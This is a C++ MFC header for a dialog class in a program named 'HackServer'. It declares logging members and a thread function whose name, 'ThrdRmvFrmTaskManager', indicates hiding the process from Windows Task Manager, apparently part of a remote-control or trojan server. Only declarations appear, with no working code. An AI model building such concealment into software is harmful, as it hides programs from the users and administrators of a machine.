// HackServerDlg.h : header file
//

#pragma once

#include "MyProtocol.h"
#include "HackSock.h"
#include "afxwin.h"

// CHackServerDlg dialog
class CHackServerDlg : public CDialog
{
// Construction
	//CHackSock Sock;
public:
	CHackServerDlg(CWnd* pParent = NULL);	// standard constructor
	void MakeLog(CString str);
	static UINT ThrdRmvFrmTaskManager(LPVOID param);
	static BOOL CALLBACK EnumChildProc(HWND hwnd,LPARAM lParam);

// Dialog Data
	enum { IDD = IDD_HACKSERVER_DIALOG };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV support
	


// Implementation
protected:
	HICON m_hIcon;

	// Generated message map functions
	
	virtual BOOL OnInitDialog();
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()
public:
	afx_msg void OnBnClickedBtexit();
	CEdit m_txtLog;
};
